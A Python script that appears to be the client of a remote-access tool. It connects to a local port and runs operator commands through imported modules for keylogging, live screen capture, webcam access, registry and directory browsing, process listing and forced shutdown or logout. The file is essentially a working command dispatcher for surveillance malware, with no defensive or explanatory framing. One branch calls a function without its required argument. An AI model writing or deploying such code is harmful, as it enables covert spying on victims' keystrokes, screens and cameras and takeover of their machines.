# import tkinter as tk
import socket
import keylogger_client as kl 
import app_process_client as ap
import directory_tree_client as dt
import live_screen_client as lss
import mac_address_client as mac
import shutdown_logout_client as sl
import registry_client as rs
import webcam_client as wc

# main = tk.Tk()
# main.geometry("200x200")
# main.title("Server")
# main['bg'] = 'plum1'

#Global variables
global client
BUFSIZ = 1024 * 4

def keylogger():
    global client
    kl.keylog(client)
    return

def shutdown_logout(msg):
    global client
    sl.shutdown_logout(msg)
    return

def mac_address():
    global client
    mac.mac_address(client)
    return

def app_process():
    global client
    ap.app_process(client)
    return

def live_screen():
    global client
    lss.capture_screen(client)
    return

def directory_tree():
    global client 
    dt.directory_handle(client)
    return

def registry():
    global client
    rs.registry_handle(client)
    return

def webcam():
    global client
    wc.run(client)
    return

#Connect
###############################################################################           
def Connect():
    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # host = ''
    # port = 5656
    # s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # s.bind((host, port))
    # s.listen(100)
    global client
    # client, addr = s.accept()
    # while True:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(("127.0.0.1", 1337))
    print("[?] Client connected!")
    while True:
        msg = client.recv(BUFSIZ).decode("utf8")
        print("[*] Recv: ", msg)
        if "KEYLOG" in msg:
            keylogger()
        elif "SD_LO" in msg:
            shutdown_logout()
        elif "LIVESCREEN" in msg:
            live_screen()
        elif  "STOP_RECEIVING" in msg:
            pass
        elif "APP_PRO" in msg:
            app_process()
        elif "MAC" in msg:
            mac_address()
        elif "DIRECTORY" in msg:
            directory_tree()
        elif "REGISTRY" in msg:
            registry()
        elif "SHUTDOWN" in msg or "LOGOUT" in msg or "RESTART" in msg:
            shutdown_logout(msg)
        elif "WEBCAM" in msg:
            webcam()
        elif "QUIT" in msg:
            client.close()
            # print("Connection closed!")
            # s.close()
            return
        else:
            print("ERROR ?") # Debugging shutdown (server close connect first)
            client.close()
            return
###############################################################################    

# tk.Button(main, text = "OPEN", width = 10, height = 2, fg = 'white', bg = 'IndianRed3', borderwidth=0,
#             highlightthickness=0, command = Connect, relief="flat").place(x = 100, y = 100, anchor = "center")
# main.mainloop()

Connect()